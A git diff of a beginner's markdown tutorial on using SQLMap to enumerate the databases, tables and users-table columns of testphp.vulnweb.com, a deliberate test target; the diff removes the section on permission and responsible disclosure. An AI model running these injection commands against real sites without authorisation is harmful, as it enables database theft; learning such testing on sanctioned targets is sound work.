@@ -47,13 +47,9 @@ Before using SQLMap, you need a URL with a parameter that could be potentially v
 - `--technique` : Specify injection techniques (e.g., `T`, `B`, `U`, `E`).
 - `--sql-shell` : Open an interactive SQL shell.
 
-Ethical Considerations and Legal Concerns
 
-- **Get Permission**: Never run SQLMap (or any penetration testing tool) against a website without **explicit permission**. This is critical to stay within legal boundaries.
-- **Bug Bounty Programs**: If you want to test websites in a legal environment, participate in **bug bounty programs** like those on **HackerOne**, **Bugcrowd**, or **Open Bug Bounty**.
-- **Responsible Disclosure**: If you find vulnerabilities during authorized testing, always follow responsible disclosure practices and report the issue to the website's owner or the relevant authority.
 
-how to retrieve data step to one by one
+How to retrieve data step to one by one
 i testing the vulnweb.php website
 
 first i used tool is sql map
@@ -77,7 +73,13 @@ sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs
 [*] acuart
 [*] information_schema
 2.
+
+
+
+
 sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+
+
 ![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
 Database: acuart
 [8 tables]
@@ -100,6 +102,11 @@ Database: acuart
 +-----------+
 
 3.
+
+
+
+
+
 sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -columns
 ![Screenshot_2024-12-10_15_32_48](https://github.com/user-attachments/assets/91e8900b-5610-4612-a1b9-49e7e4fa39bf)
 
@@ -129,6 +136,11 @@ Table: users
 +---------+--------------+
 
 4.
+
+
+
+
+
 sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -columns
 
 ![Screenshot_2024-12-10_16_13_32](https://github.com/user-attachments/assets/6c0f4464-2923-400d-b693-390f57d3a989)
